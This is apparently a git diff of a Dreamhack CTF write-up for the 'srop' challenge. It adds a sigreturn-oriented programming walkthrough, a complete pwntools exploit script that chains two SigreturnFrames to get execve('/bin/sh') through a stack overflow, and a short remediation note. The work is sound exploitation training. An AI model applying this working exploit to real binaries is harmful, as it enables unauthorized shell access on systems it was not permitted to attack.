@@ -2,10 +2,9 @@
 title: "[Dreamhack] srop - Write up"
 date: 2024-01-15 00:00:00 +0700
 categories: [Dreamhack, Binary Exploitation]
-tags: [pwn, srop, sigreturn, rop, nx, syscall, dreamhack]
+tags: [pwn, srop, sigreturn, syscall, dreamhack]
 author: datious
 ---
-
 [Write up for dreamhack]__Challenge: srop | Author: datious
 
 srop.c
@@ -69,4 +68,82 @@ stage1+=bytes(frame1)
 ```
 stage2=p64(pop_rax_syscall)+p64(15)
 
-frame2=Si
+frame2=SigreturnFrame()
+frame2.rsp=rw
+frame2.rax=0x3b
+frame2.rdi=rw+0x200
+frame2.rsi=0
+frame2.rdx=0
+frame2.rip=syscall
+stage2+=bytes(frame2)
+stage2=stage2.ljust(0x200,b'\x00')
+stage2+=b'/bin/sh\x00'
+```
+- I arranged stage2 into the writable memory and set up **frame2(execve("/bin/sh"))**. In frame1, I set **frame1.rsp=rw**, so that when finish executing, the program will return to rw section (where stage2, frame2 and the "/bin/sh" string are placed).
+- The flow: stage1 (rt_sigreturn(1))->kernel-> restore frame1 (read(0,rw,len(stage2)))-> sends stage2(rt_sigreturn+frame2+"/bin/sh") -> stage2 is placed into rw memory -> Because frame1.rsp=rw, after read(0,rw,len(stage2)) finishes, the program returns to rw (rip=rsp=rw) -> rt_sigreturn(2) -> kernel -> restore frame2 (execve("/bin/sh")).
+
+3. Exploit Script
+```
+#!/usr/bin/python3
+from pwn import *
+import os
+exe=ELF('./srop',checksec=False)
+#p=remote("host3.dreamhack.games",19369)
+p=process(exe.path)
+
+context.terminal=['konsole','-e']
+
+
+context.arch="x86_64"
+
+pop_rax_syscall=0x00000000004004eb
+pop_rdi=0x0000000000400583
+ret=0x00000000004003de
+syscall=0x00000000004004ec
+pop_rsi=0x0000000000400581 #pop_r15
+rw=0x0000000000601100
+
+stage2=p64(pop_rax_syscall)+p64(15)
+
+frame2=SigreturnFrame()
+frame2.rsp=rw
+frame2.rax=0x3b
+frame2.rdi=rw+0x200
+frame2.rsi=0
+frame2.rdx=0
+frame2.rip=syscall
+stage2+=bytes(frame2)
+stage2=stage2.ljust(0x200,b'\x00')
+stage2+=b'/bin/sh\x00'
+
+
+frame1=SigreturnFrame()
+frame1.rsp=rw
+frame1.rax=0
+frame1.rdi=0
+frame1.rsi=rw
+frame1.rdx=len(stage2)
+frame1.rip=syscall
+stage1=p64(1)
+stage1+=p64(2)
+stage1+=p64(15)
+stage1+=p64(pop_rax_syscall)
+stage1+=p64(15)
+
+stage1+=bytes(frame1)
+p.sendline(stage1)
+sleep(0.5)
+
+
+p.sendline(stage2)
+
+p.interactive()
+```
+
+
+Remediation
+    - The issue: a classic stack-based buffer overflow due to an unchecked input length.
+    - The fix: limit the number of bytes accepted by the read() to match to the actual size of the destination buffer (changing 1024 to 16 or using fgets())
+
+
+Goodluck!!!
